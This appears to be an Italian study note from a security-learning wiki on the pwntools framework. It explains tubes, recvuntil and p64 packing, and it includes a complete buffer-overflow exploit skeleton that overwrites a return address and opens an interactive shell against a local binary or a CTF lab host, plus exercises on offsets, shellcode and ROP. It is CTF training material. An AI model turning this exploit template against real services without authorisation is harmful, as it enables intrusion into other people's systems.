---
tipo: concetto
tag: [tool]
fase: 1
fonti: 4
aggiornato: 2026-06-28
stato: maturo
aliases: ["pwntools Base"]
---

# pwntools Base

> **Nota etica**: l'exploit development si pratica **solo** su binari e servizi tuoi o di challenge
> autorizzate (TryHackMe, pwn.college, CTF, lab). Sfruttare un servizio di terzi è reato.

## In breve
**pwntools** è il framework di riferimento per il **binary exploitation** e l'interazione con servizi:
sostituisce il dialogo manuale con [[netcat]] e gli script socket grezzi (vedi
[[Socket e Port Scanner]]) con un'API pensata per gli exploit. Il suo valore è uniformare il modello:
che tu parli con un **processo locale** o con un **servizio remoto**, l'interfaccia è identica —
`recv`/`send`/`recvuntil`. Scrivi l'exploit in locale, cambi una riga e lo lanci sul target remoto.

## Il concetto chiave: la "tube"
pwntools astrae ogni canale di I/O come una **tube** (un tubo bidirezionale di byte):
- `process("./vuln")` → tube verso un **processo locale** (per sviluppare e testare).
- `remote("host", 1337)` → tube verso un **servizio remoto** (lo stesso exploit, in produzione).
Stessi metodi su entrambe. Questo è il motivo per cui si sviluppa in locale e si "spara" in remoto
senza riscrivere nulla: cambia solo come si crea la tube.

## I metodi che contano
- `recvuntil(b"prompt")` — leggi **finché** non arriva un delimitatore (es. il prompt del programma).
  È il modo robusto di sincronizzarsi: non indovini quanti byte, aspetti il marcatore.
- `sendline(b"dati")` — invia dati + newline (come premere Invio).
- `interactive()` — passa il controllo a te: utile dopo aver ottenuto una shell (vedi
  [[Reverse Shell e Bind Shell]]).
- `p32`/`p64` — **packing**: trasformano un numero (es. un indirizzo `0xdeadbeef`) nei byte in ordine
  little-endian che il binario si aspetta. È il ponte tra "numero" e "byte da inviare".

## Script completo — interazione con un servizio e invio di un payload

```python
#!/usr/bin/env python3
# exploit.py — scheletro di exploit pwntools. SOLO su binari/servizi autorizzati (CTF/lab).

from pwn import *                   # convenzione pwntools: importa tutto (process, remote, p64, context...)
import sys

# context: imposta l'architettura globale. Tutti i p32/p64/asm seguono questi parametri.
context.arch = "amd64"             # architettura del target (x86-64)
context.log_level = "info"         # 'debug' mostra TUTTI i byte scambiati (utile mentre sviluppi)

def crea_tube():
    """Ritorna una tube locale o remota a seconda dell'argomento. STESSO exploit per entrambe."""
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        # produzione: ci si collega al servizio reale (host, porta della challenge)
        return remote("lab.example.ctf", 1337)
    # sviluppo: lanciamo il binario in locale e ci parliamo via stdin/stdout
    return process("./vuln")

def main() -> None:
    io = crea_tube()               # 'io' è la tube: stessa API che sia locale o remota

    # 1) Sincronizzati: leggi finché il programma chiede l'input. NON indovinare i byte, aspetta il prompt.
    io.recvuntil(b"Inserisci la password: ")

    # 2) Costruisci il payload. Esempio didattico di buffer overflow:
    #    - 64 byte per riempire il buffer fino al return address salvato
    #    - poi sovrascriviamo il return address con quello della funzione 'win'
    offset = 64                                  # distanza buffer -> return address (trovata col debugger)
    indirizzo_win = 0x004011d6                   # indirizzo della funzione target (da 'nm'/Ghidra)
    payload  = b"A" * offset                     # riempimento ("padding")
    payload += p64(indirizzo_win)                # packing a 64 bit little-endian: numero -> byte

    log.info(f"Payload di {len(payload)} byte (offset {offset})")
    io.sendline(payload)                         # invia il payload + newline

    # 3) Leggi la risposta del programma dopo l'invio
    io.recvuntil(b"\n")

    # 4) Se l'exploit ha aperto una shell, passa al controllo interattivo (digiti tu i comandi)
    log.success("Payload inviato — passo alla shell interattiva")
    io.interactive()               # da qui in poi sei "dentro": prova 'id', 'cat flag.txt'

if __name__ == "__main__":
    main()
```

## La logica chiave
- **Stessa tube, due mondi**: la funzione `crea_tube()` isola l'*unica* differenza tra locale e remoto.
  Sviluppi e debuggi su `process()`, poi `python exploit.py remote` e parti. È il workflow standard del
  CTF.
- **`recvuntil`, non `recv(n)`**: sincronizzarsi su un **marcatore** è robusto; contare i byte a mano è
  fragile (cambia con padding, lunghezza dei messaggi). Aspetti il prompt e sei sempre allineato.
- **Packing (`p64`)**: la CPU x86-64 è **little-endian**. Un indirizzo va inviato byte invertiti.
  `p64` fa la conversione: ti permette di ragionare in numeri e lasciare a pwntools i byte giusti.
- **`context`**: un setting globale invece di ripetere arch/endianness a ogni chiamata. Imposti una
  volta, tutto il resto si adegua.

## Oltre lo scheletro
pwntools include molto altro: `cyclic(200)`/`cyclic_find()` per **trovare l'offset** di un overflow,
`ELF("./vuln")` per leggere simboli e indirizzi dal binario, `shellcraft` per generare shellcode,
`ROP()` per costruire catene ROP. Lo scheletro sopra è la base su cui questi si innestano.

## Esercizio progressivo
1. **Base**: usa `cyclic(100)` come payload, fai crashare il binario in un debugger (gdb-pwndbg) e con
   `cyclic_find()` ricava l'`offset` esatto invece di hardcodarlo.
2. **Intermedio**: sostituisci l'indirizzo hardcoded con `ELF("./vuln").symbols["win"]` — così
   l'exploit si adatta se il binario viene ricompilato.
3. **Avanzato**: aggancia il debugger con `gdb.attach(io)` per ispezionare lo stato durante l'exploit,
   e prova un ritorno a una shell con `shellcraft.sh()` invece che a una funzione `win` esistente.

## Lab
- **pwn.college** / **ROP Emporium** — risolvi le prime challenge interagendo col binario via pwntools.
- **picoCTF** categoria *Binary Exploitation*. Collega gli script a [[Stack Buffer Overflow]] e [[ret2libc e ROP]].

## Domande
**D: Cos'è una "tube" in pwntools?**
R: L'astrazione di un canale I/O (`process`, `remote`, `ssh`) con la stessa API → lo stesso exploit
gira in locale e da remoto cambiando una riga.

**D: Differenza tra `recvuntil`, `recvline` e `recvn`?**
R: `recvuntil(delim)` legge fino a un delimitatore arbitrario; `recvline()` fino a newline; `recvn(k)`
esattamente k byte. Servono a sincronizzarsi col protocollo del servizio.

**D: A cosa servono `p64()`/`u64()`?**
R: Pack/unpack di interi in little-endian per costruire payload (indirizzi, gadget) e interpretare
leak di memoria.

## Collegamenti
- [[Socket e Port Scanner]] — il livello socket grezzo che pwntools astrae
- [[netcat]] — l'interazione manuale che pwntools automatizza
- [[Reverse Shell e Bind Shell]] — l'obiettivo finale di molti exploit
- [[Exploitation]] — la fase del pentest in cui questo entra in gioco
- [[Python per la Sicurezza]] — setup e venv per installare pwntools

## Fonti
- pwntools — documentazione: https://docs.pwntools.com/en/stable/
- pwntools — Getting Started: https://docs.pwntools.com/en/stable/intro.html
- pwntools — tubes (process/remote): https://docs.pwntools.com/en/stable/tubes.html
- pwn.college (esercizi di exploitation): https://pwn.college/
